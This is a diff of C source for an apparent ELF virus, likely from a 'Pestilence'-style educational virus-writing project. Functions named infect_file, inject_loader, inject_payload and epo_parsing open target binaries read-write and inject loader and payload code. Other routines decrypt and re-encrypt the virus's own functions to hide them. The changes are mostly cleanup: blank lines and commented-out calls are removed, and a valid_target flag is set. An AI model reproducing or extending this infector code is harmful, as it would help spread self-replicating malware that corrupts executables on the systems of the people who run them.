@@ -8,9 +8,7 @@ static void	init_info(t_info *info, size_t *tab_addr)
 	info->in_pestilence = 0;
 
 	info->tab_addr = tab_addr;
-
 }
-
 
 static void	inject_payload(t_info *info)
 {
@@ -23,7 +21,6 @@ static void	inject_payload(t_info *info)
 	patch_payload(info);
  	reencrypt_func(info, &patch_payload, info->tab_addr[15] - info->tab_addr[14], key);
 }
-
 
 static void	inject_loader(t_info *info)
 {
@@ -40,7 +37,6 @@ static void	inject_bis(t_info *info)
 	addr = &syscalls;
 	ft_memcpy(info->file + info->offset_bis, addr, BIS_SIZE);
 }
-
 
 static int		reload_mapping(t_info *info)
 {
@@ -92,6 +88,7 @@ static void	infect_file(char *path, t_fingerprint *fingerprint, t_info *info)
 	
 	if ((info->fd = ft_sysopen(path, O_RDWR)) < 0)
 		return ;
+	info->valid_target = 1;
 	ft_sysfstat(info->fd, &st);
 	info->file_size = st.st_size;
 	if ((info->file_size > 50*1024*1024) || info->file_size < sizeof(Elf64_Ehdr) + sizeof(Elf64_Phdr))
@@ -115,14 +112,8 @@ static void	infect_file(char *path, t_fingerprint *fingerprint, t_info *info)
 	reencrypt_func(info, &find_text, info->tab_addr[6] - info->tab_addr[5], key);
 	if (ret == 1)
 		goto end_fct;
-	//key =  decrypt_func(info, &inject_loader, info->tab_addr[23] - info->tab_addr[22], 22);
 	inject_loader(info);
-	//reencrypt_func(info, &inject_loader, info->tab_addr[23] - info->tab_addr[22], key);
-	// nice_with_gdb(info);
-	//VOIR ICI
-// 	key = decrypt_func(info, &inject_payload, info->tab_addr[22] - info->tab_addr[21], 21);
 	inject_payload(info);
-// 	reencrypt_func(info, &inject_payload, info->tab_addr[22] - info->tab_addr[21], key);
 	inject_bis(info);
 	key = decrypt_func(info, &epo_parsing, info->tab_addr[9] - info->tab_addr[8], 8);
 	epo_parsing(info);
